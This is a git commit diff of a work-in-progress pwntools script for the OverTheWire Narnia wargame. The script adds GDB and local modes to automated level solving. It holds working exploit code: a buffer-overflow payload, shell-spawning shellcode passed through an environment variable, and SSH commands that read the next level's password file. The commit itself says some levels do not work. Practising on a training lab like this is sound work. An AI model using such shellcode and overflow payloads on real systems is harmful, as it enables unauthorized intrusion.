fa96cf347a758834f88522dcae8654c40ad4e7c1
Kasper Føns <kfoens@gmail.com>
2021-03-01 19:58:42 +0100

    Expand narnia to allow for gdb. Does not always work. Level1 does not work

--- overthewire.org/narnia/solution.in.progress.py
+++ overthewire.org/narnia/solution.in.progress.py
@@ -10,30 +10,61 @@ pwn.context(arch='i386')
 
 solutions = [  # Entry <i> is the solution to narnia<i>
     pwn.flat('A' * 20, 0xdeadbeef),
-    pwn.asm(pwn.shellcraft.sh())
+    pwn.asm(pwn.shellcraft.sh()),
+    pwn.cyclic(200)
 ]
+
+# Run this python script inside tmux like this:
+# $> tmux
+# $> ./exploit GDB
+# It will spawn a separate window with the GDB session
+pwn.context.terminal = ["tmux", "splitw", "-h"]
+
+gdbscript = '''
+continue
+'''.format(**locals())
 
 
 def ssh_connect(level_id, level_password):
     return pwn.ssh(user='narnia%d' % level_id, password=level_password, host="narnia.labs.overthewire.org", port=2226)
 
 
+def start(level_id, level_password, argv=[], *a, **kw):
+    """Start the exploit against the target."""
+    local_path = "challenges/narnia%d" % level_id
+    if pwn.args.GDB:
+        return pwn.gdb.debug([local_path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif pwn.args.LOCAL:
+        return pwn.process([local_path] + argv, *a, **kw)
+    else:
+        ssh = ssh_connect(level_id, level_password)
+        return ssh.process(['/narnia/narnia%d' % level_id] + argv, *a, **kw)
+
+
 def solve(level_id, level_password, attack):
     doing.update('Solving narnia%d\n' % level_id)
-    ssh = ssh_connect(level_id, level_password)
     env = None
+    args = []
     if level_id == 1:
         env = {'EGG': attack}
-    process = ssh.process('/narnia/narnia%d' % level_id, env=env)
-    if level_id != 1:
-        process.send(attack)
-    process.recvrepeat(1)
-    process.sendline("cat /etc/narnia_pass/narnia%d" % (level_id + 1))
-    next_password = process.recvline().strip().decode('utf8')
-    process.close()
-    ssh.close()
-    print('Password for narnia%d is: %s' % (level_id + 1, next_password))
-    return next_password
+    if level_id == 2:
+        args = [attack]
+    io = start(level_id, level_password, args, env=env)
+    if level_id != 1 and level_id != 2:
+        io.send(attack)
+    io.recvrepeat(1 if not pwn.args.GDB else 10)
+    if pwn.args.LOCAL or pwn.args.GDB:
+        io.sendline('whoami')
+        user = io.recvline().strip().decode('utf8')
+        io.close()
+        print('Current user for narnia%d is: %s' % (level_id + 1, user))
+        return user
+    else:
+        io.sendline("cat /etc/narnia_pass/narnia%d" % (level_id + 1))
+        next_password = io.recvline().strip().decode('utf8')
+        io.close()
+        print('Password for narnia%d is: %s' % (level_id + 1, next_password))
+        return next_password
 
 
 def download_binary_and_source(level_id, level_password):
@@ -63,7 +94,7 @@ def download_binary_and_source(level_id, level_password):
 
 password = 'narnia0'
 i = -1
-for i in range(0, len(solutions)):
+for i in range(0 if not pwn.args.LAST else len(solutions)-1, len(solutions)):
     download_binary_and_source(i, password)
     password = solve(i, password, solutions[i])
 
